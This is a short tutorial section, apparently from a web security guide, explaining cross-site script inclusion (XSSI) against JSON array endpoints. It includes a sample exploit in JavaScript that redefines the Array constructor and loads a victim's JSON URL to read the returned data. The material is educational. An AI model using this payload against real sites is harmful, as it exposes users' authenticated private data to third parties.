# 7.1 XSSI Overview

A JSON vulnerability allows third party website to turn your JSON resource URL into JSONP request under some conditions.
Exposed when a GET request is made to retrieve JSON information as an array.
Combined to a CSRF attack. 

## How XSSI works ?

1. Cross-domain HTTP requests is possible via the `src` attribute of `<script>` tag
1. Your browser sends your credential automatically
1. Returning a JSON array is valid as the source for a JavaScript `<script>` tag
1. JavaScript allows us to redefine the Array constructor

Sample Exploit:

``` typescript
<script type="text/javascript">
    var secrets;
    Array = function() {
        secrets = this;
    };
</script>

<script src="http://victim.com/demos/secret-info.json" type="text/javascript"></script>

<script type="text/javascript">
    var yourData = '';
    var i = -1;
    while(secrets[++i]) {
        yourData += secrets[i] + ' ';
    }
    alert('I stole your data, I can exploit it / send it to another server : ' + yourData);
</script>
```

